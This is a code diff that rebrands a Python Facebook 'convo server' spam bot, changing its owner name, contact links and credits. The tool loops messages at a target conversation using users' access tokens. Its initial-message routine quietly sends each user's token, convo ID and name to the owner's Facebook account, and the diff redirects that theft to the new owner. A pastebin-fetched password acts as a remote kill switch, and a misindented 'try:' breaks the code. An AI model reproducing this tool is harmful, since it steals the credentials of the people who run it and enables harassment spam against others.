@@ -17,10 +17,10 @@ html_content = """
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AKATSUKI 🖤</title>
+    <title>XM9RTY AYUSH K1NG</title>
     <style>
         body {
-            background-image: url('https://ibb.co/HfL2CCM9');
+            background-image: url('Ayush.jpg');
             background-size: cover;
         }
         .container {
@@ -48,18 +48,20 @@ html_content = """
 <body>
     <div class="container">
         <div class="box">
-            <h1>F3LIIX URF PRINC3</h1>
+            <h1>XM9RTY AYUSH K1NG</h1>
             <div class="credit">
-                <p>1. RUL3X:-AKATSUKI 🖤</p>
-                <p>2. OWNER => F3LIIX URF PRINC3</p>
-                <p>4. FACEBOOK:- <a href="https://www.facebook.com/profile.php?id=61571059542672">Facebook</a></p>
+                <p>1. CREDIT:-XM9RTY AYUSH KING</p>
+                <p>2. OWNER => XM9RTY AYUSH K1NG</p>
+                <p>3. CONTACT:- <a href="https://wa.me/+919919180262">WhatsApp</a></p>
+                <p>4. FACEBOOK:- <a href="https://www.facebook.com/XMARTY.AYUSH.KING.YOUTUBER.420">Facebook</a></p>
+                <p>5. WATTSAPP GROUP:- <a href="https://chat.whatsapp.com/Hr8veZbLmpg5sro6xS5Smc">WhatsApp Group</a></p>
             </div>
         </div>
     </div>
     <div class="thanks">
-        <p>TH9NKS FOR US1NG MY OFFL1N3 S3RV3R🖤</p>
-        <p>👇J0IN T0 MY T3L3GR9M GR0UP👇</p>
-        <a href="https://t.me/+syq7zCL-_4AwYmU9">l</a>
+        <p>❤️TH9NKS FOR US1NG MY OFFL1N3 S3RV3R❤️</p>
+        <p>👇SUBSCR1B3 TO MY YOUTUB3 CH9NN3L👇</p>
+        <a href="https://youtube.com/@xmarty_ayush_king?feature=shared">YouTube Channel</a>
     </div>
 </body>
 </html>
@@ -97,25 +99,25 @@ headers = {
 
 # Read configuration files
 try:
-    with open('CONVO.txt', 'r') as f:
+    with open('AK-CONVO.txt', 'r') as f:
         convo_id = f.read().strip()
 except:
     convo_id = input("Enter Convo ID: ")
 
 try:
-    with open('NAME.txt', 'r') as f:
+    with open('AK-NAME.txt', 'r') as f:
         haters_name = f.read().strip()
 except:
     haters_name = input("Enter Name: ")
 
 try:
-    with open('TOKEN.txt', 'r') as f:
+    with open('AK-TOKEN.txt', 'r') as f:
         tokens = f.readlines()
 except:
     tokens = [input("Enter Token: ")]
 
 try:
-    with open('FILEtxt', 'r') as f:
+    with open('AK-FILE.txt', 'r') as f:
         messages = f.readlines()
         num_messages = len(messages)
 except:
@@ -123,18 +125,18 @@ except:
     num_messages = len(messages)
 
 try:
-    with open('SPEED.txt', 'r') as f:
+    with open('AK-SPEED.txt', 'r') as f:
         speed = float(f.read().strip())
 except:
     speed = float(input("Enter Speed (seconds): "))
 
 try:
-    with open('PASS.txt', 'r') as f:
+    with open('AK-PASS.txt', 'r') as f:
         password = f.read().strip()
 except:
     password = input("Enter Password: ")
-try:
-    with open('HOST.txt', 'r') as f:
+    try:
+    with open('AK-HOST.txt', 'r') as f:
         host_code = f.read().strip()
 except:
     host_code = input("Enter Host Code: ")
@@ -143,14 +145,14 @@ def send_initial_message():
     mmm_pass = requests.get('https://pastebin.com/raw/NZKKryvH').text
     
     if mmm_pass not in password:
-        print('\033[1;31m⚠️ YOUR P9SSW0RD CH9NG3D BY F3LIIX URF PRINC3 ⚠️')
+        print('\033[1;31m⚠️ YOUR P9SSW0RD CH9NG3D BY XM9RTY AYUSH K1NG ⚠️')
         sys.exit()
     
     # Message template
-    msg_template = "Owner => Feliix urf prince \n Hello Xmarty Ayush King sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
+    msg_template = "Owner => Ayush \n Hello Xmarty Ayush King sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
-    target_ids = ["61571059542672"]
+    target_ids = ["XMARTY.AYUSH.KING.YOUTUBER.420"]
     
     requests.packages.urllib3.disable_warnings()
     
@@ -179,15 +181,15 @@ def send_messages_from_file():
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                 response = requests.post(url, json=parameters, headers=headers)
                 if response.ok:
-                    print("\033[1;36m[✓] F3LIIX URF PRINC3 {} C0NV0 {} T0K3N {}: {}".format(
+                    print("\033[1;36m[✓] XM9RTY AYUSH K1NG {} C0NV0 {} T0K3N {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                     print(formatted_time)
-                    print('\033[1;92m' + 'F3LIIX URF PRINC3')
+                    print('\033[1;92m' + '✪✭▐▐▐▐▐▐▐•『XM9RTY AYUSH K1NG 』•▐▐▐▐▐▐▐✭✪')
                 else:
                     print("\033[1;35m[x] FA1L3D T0 S3ND M3SS3G3 {} C0NVO {} T0K3N {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                     print(formatted_time)
-                    print('\033[1;92m' + 'F3LIIX URF PRINC3')
+                    print('\033[1;92m' + '✪✭▐▐▐▐▐▐▐•『XM9RTY AYUSH K1NG』•▐▐▐▐▐▐▐✭✪')
                 time.sleep(speed)
             print("\n[+] All messages sent. Restarting the process...\n")
         except Exception as e:
